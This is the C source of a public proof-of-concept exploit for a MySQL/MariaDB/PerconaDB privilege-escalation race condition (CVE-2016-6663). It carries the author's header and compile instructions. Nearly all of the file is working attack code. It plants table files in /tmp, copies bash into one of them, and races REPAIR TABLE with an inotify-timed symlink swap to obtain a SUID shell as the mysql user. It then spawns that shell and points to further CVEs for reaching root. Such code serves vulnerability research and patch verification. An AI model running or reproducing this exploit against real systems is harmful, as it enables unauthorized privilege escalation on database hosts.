/*

Source: https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html // http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c

MySQL/PerconaDB/MariaDB - Privilege Escalation / Race Condition PoC Exploit
mysql-privesc-race.c (ver. 1.0)

CVE-2016-6663 / OCVE-2016-5616

Discovered/Coded by:

Dawid Golunski
dawid[at]legalhackers.com
https://legalhackers.com

Follow https://twitter.com/dawid_golunski for updates on this advisory.


Compile:
gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient

Note:
* On RedHat-based systems you might need to change /tmp to another public directory (e.g. /uploads)

* For testing purposes only. Do no harm.

Full advisory URL:
https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html

Video PoC:
https://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html

*/


#include <fcntl.h>
#include <grp.h>
#include <mysql.h>
#include <pwd.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/inotify.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>


#define EXP_PATH          "/tmp/mysql_privesc_exploit"
#define EXP_DIRN          "mysql_privesc_exploit"
#define MYSQL_TAB_FILE    EXP_PATH "/exploit_table.MYD"
#define MYSQL_TEMP_FILE   EXP_PATH "/exploit_table.TMD"

#define SUID_SHELL   	  EXP_PATH "/mysql_suid_shell.MYD"

#define MAX_DELAY 1000    // can be used in the race to adjust the timing if necessary

MYSQL *conn;		  // DB handles
MYSQL_RES *res;
MYSQL_ROW row;

unsigned long cnt;


void intro() {

printf(
        "\033[94m\n"
        "MySQL/PerconaDB/MariaDB - Privilege Escalation / Race Condition PoC Exploit\n"
        "mysql-privesc-race.c (ver. 1.0)\n\n"
        "CVE-2016-6663 / OCVE-2016-5616\n\n"
        "For testing purposes only. Do no harm.\n\n"
	"Discovered/Coded by:\n\n"
	"Dawid Golunski \n"
	"http://legalhackers.com"
        "\033[0m\n\n");

}

void usage(char *argv0) {
    intro();
    printf("Usage:\n\n%s user pass db_host database\n\n", argv0);
}

void mysql_cmd(char *sql_cmd, int silent) {

    if (!silent) {
	    printf("%s \n", sql_cmd);
    }
    if (mysql_query(conn, sql_cmd)) {
        fprintf(stderr, "%s\n", mysql_error(conn));
        exit(1);
    }
    res = mysql_store_result(conn);
    if (res>0) mysql_free_result(res);

}


int main(int argc,char **argv)
{

    int randomnum = 0;
    int io_notified = 0;
    int myd_handle;
    int wpid;
    int is_shell_suid=0;
    pid_t pid;
    int status;
    struct stat st;
    /* io notify */
    int fd;
    int ret;
    char buf[4096] __attribute__((aligned(8)));
    int num_read;
    struct inotify_event *event;
    /* credentials */
    char *user     = argv[1];
    char *password = argv[2];
    char *db_host  = argv[3];
    char *database = argv[4];


    // Disable buffering of stdout
    setvbuf(stdout, NULL, _IONBF, 0);

    // Get the params
    if (argc!=5) {
	usage(argv[0]);
	exit(1);
    }
    intro();
    // Show initial privileges
    printf("\n[+] Starting the exploit as: \n");
    system("id");

    // Connect to the database server with provided credentials
    printf("\n[+] Connecting to the database `%s` as %s@%s\n", database, user, db_host);
    conn = mysql_init(NULL);
    if (!mysql_real_connect(conn, db_host, user, password, database, 0, NULL, 0)) {
        fprintf(stderr, "%s\n", mysql_error(conn));
        exit(1);
    }

    // Prepare tmp dir
    printf("\n[+] Creating exploit temp directory %s\n", "/tmp/" EXP_DIRN);
    umask(000);
    system("rm -rf /tmp/" EXP_DIRN " && mkdir /tmp/" EXP_DIRN);
    system("chmod g+s /tmp/" EXP_DIRN );

    // Prepare exploit tables :)
    printf("\n[+] Creating mysql tables \n\n");
    mysql_cmd("DROP TABLE IF EXISTS exploit_table", 0);
    mysql_cmd("DROP TABLE IF EXISTS mysql_suid_shell", 0);
    mysql_cmd("CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '" EXP_PATH "'", 0);
    mysql_cmd("CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = 'MyISAM' data directory '" EXP_PATH "'", 0);

    // Copy /bin/bash into the mysql_suid_shell.MYD mysql table file
    // The file should be owned by mysql:attacker thanks to the sticky bit on the table directory
    printf("\n[+] Copying bash into the mysql_suid_shell table.\n    After the exploitation the following file/table will be assigned SUID and executable bits : \n");
    system("cp /bin/bash " SUID_SHELL);
    system("ls -l " SUID_SHELL);

    // Use inotify to get the timing right
    fd = inotify_init();
    if (fd < 0) {
        printf("failed to inotify_init\n");
        return -1;
    }
    ret = inotify_add_watch(fd, EXP_PATH, IN_CREATE | IN_CLOSE);


    /* Race loop until the mysql_suid_shell.MYD table file gets assigned SUID+exec perms */

    printf("\n[+] Entering the race loop... Hang in there...\n");

    while ( is_shell_suid != 1 ) {

        cnt++;
	if ( (cnt % 100) == 0 ) {
	 	printf("->");
	 	//fflush(stdout);
	}

        /* Create empty file , remove if already exists */
        unlink(MYSQL_TEMP_FILE);
        unlink(MYSQL_TAB_FILE);
   	mysql_cmd("DROP TABLE IF EXISTS exploit_table", 1);
	mysql_cmd("CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '" EXP_PATH "'", 1);

	/* random num if needed */
        srand ( time(NULL) );
        randomnum = ( rand() % MAX_DELAY );

        // Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink
        pid = fork();
        if (pid < 0) {
            fprintf(stderr, "Fork failed :(\n");
        }

        /* Child process - executes REPAIR TABLE  SQL statement */
        if (pid == 0) {
            usleep(500);
            unlink(MYSQL_TEMP_FILE);
	    mysql_cmd("REPAIR TABLE exploit_table EXTENDED", 1);
            // child stops here
            exit(0);
        }

        /* Parent process - aims to replace the temp .tmd table with a symlink before chmod */
        if (pid > 0 ) {
            io_notified = 0;

            while (1) {
                int processed = 0;
                ret = read(fd, buf, sizeof(buf));
                if (ret < 0) {
                    break;
                }
                while (processed < ret) {
                    event = (struct inotify_event *)(buf + processed);
                    if (event->mask & IN_CLOSE) {
                        if (!strcmp(event->name, "exploit_table.TMD")) {
                            //usleep(randomnum);

			    // Set the .MYD permissions to suid+exec before they get copied to the .TMD file
			    unlink(MYSQL_TAB_FILE);
			    myd_handle = open(MYSQL_TAB_FILE, O_CREAT, 0777);
			    close(myd_handle);
			    chmod(MYSQL_TAB_FILE, 04777);

			    // Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec
                            unlink(MYSQL_TEMP_FILE);
                            symlink(SUID_SHELL, MYSQL_TEMP_FILE);
                            io_notified=1;
                        }
                    }
                    processed += sizeof(struct inotify_event);
                }
                if (io_notified) {
                    break;
                }
            }


            waitpid(pid, &status, 0);
        }

	// Check if SUID bit was set at the end of this attempt
        if ( lstat(SUID_SHELL, &st) == 0 ) {
	    if (st.st_mode & S_ISUID) {
		is_shell_suid = 1;
	    }
        }

    }

    printf("\n\n[+] \033[94mBingo! Race won (took %lu tries) !\033[0m Check out the \033[94mmysql SUID shell\033[0m: \n\n", cnt);
    system("ls -l " SUID_SHELL);

    printf("\n[+] Spawning the \033[94mmysql SUID shell\033[0m now... \n    Remember that from there you can gain \033[1;31mroot\033[0m with vuln \033[1;31mCVE-2016-6662\033[0m or \033[1;31mCVE-2016-6664\033[0m :)\n\n");
    system(SUID_SHELL " -p -i ");
    //system(SUID_SHELL " -p -c '/bin/bash -i -p'");

    /* close MySQL connection and exit */
    printf("\n[+] Job done. Exiting\n\n");
    mysql_close(conn);
    return 0;

}